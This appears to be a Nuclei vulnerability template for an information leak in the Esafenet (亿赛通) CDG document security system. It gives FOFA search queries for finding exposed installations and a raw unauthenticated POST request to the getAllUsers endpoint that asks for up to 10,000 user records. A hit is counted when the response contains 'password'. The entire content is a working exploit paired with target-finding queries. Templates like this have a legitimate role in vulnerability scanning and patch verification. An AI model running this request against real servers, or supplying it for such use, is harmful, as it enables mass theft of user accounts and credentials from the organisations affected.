id: yisaitong-getAllUsers

info:
  tags: yisaitong-getAllUsers
  name: 亿赛通通电子文档安全管理系统getAllUsers接口存在信息泄露漏洞
  author: xc
  severity: high
  description: |-
    fofa: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp" || body="/CDGServer3/index.jsp"

http:
  - raw:
      - |
        POST /CDGServer3/openapi/getAllUsers HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 27

        pageSize=10000&pageNumber=1

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'password'
      - type: status
        status: 
          - 200
